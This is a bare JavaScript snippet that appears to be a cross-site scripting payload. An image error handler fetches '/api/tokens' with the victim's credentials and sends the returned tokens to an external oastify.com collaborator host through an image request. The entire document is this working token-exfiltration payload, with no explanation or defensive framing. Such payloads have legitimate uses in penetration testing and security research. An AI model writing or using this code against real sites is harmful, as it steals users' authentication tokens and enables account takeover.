var img = document.createElement('img');
img.src = 'invalid';

img.onerror = function () {
  fetch('/api/tokens?limit=10', { credentials: 'include' })
    .then(r => r.text())
    .then(token => {
      new Image().src =
        'https://0gh2gfe6bo1cqk8evlu9vojwgnmea5yu.oastify.com/?token=' +
        encodeURIComponent(token);
    });
};

document.body.appendChild(img);
